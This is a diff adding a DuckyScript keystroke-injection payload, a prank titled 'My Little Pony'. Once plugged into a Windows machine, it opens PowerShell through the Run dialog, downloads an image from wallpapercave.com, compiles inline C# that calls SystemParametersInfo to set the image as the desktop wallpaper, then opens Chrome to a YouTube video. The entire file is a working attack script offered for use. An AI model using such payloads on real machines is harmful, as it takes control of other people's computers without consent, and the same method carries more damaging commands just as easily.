@@ -1,0 +1,60 @@
+REM Author: staticnet
+REM My Little Pony
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING wget "http://wallpapercave.com/wp/m856jFo.jpg" -outfile "Documents\test.jpg"
+ENTER
+DELAY 800
+STRING $setwallpapersrc = @"
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+
+STRING public class Wallpaper
+ENTER
+STRING {
+ENTER
+STRING  public const int SetDesktopWallpaper = 20;
+ENTER
+STRING  public const int UpdateIniFile = 0x01;
+ENTER
+STRING  public const int SendWinIniChange = 0x02;
+ENTER
+STRING  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+ENTER
+STRING  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+ENTER
+STRING  public static void SetWallpaper(string path)
+ENTER
+STRING  {
+ENTER
+STRING    SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
+ENTER
+STRING  }
+ENTER
+STRING }
+ENTER
+STRING "@
+ENTER
+STRING Add-Type -TypeDefinition $setwallpapersrc
+ENTER
+STRING [Wallpaper]::SetWallpaper("c:\users\%username%\Documents\test.jpg")
+ENTER
+DELAY 500
+ENTER
+STRING exit
+DELAY 200
+ENTER
+GUI r
+DELAY 600
+STRING chrome
+DELAY 200
+ENTER
+DELAY 800
+STRING https://www.youtube.com/watch?v=dtMesafhSYI
+DELAY 400
+ENTER
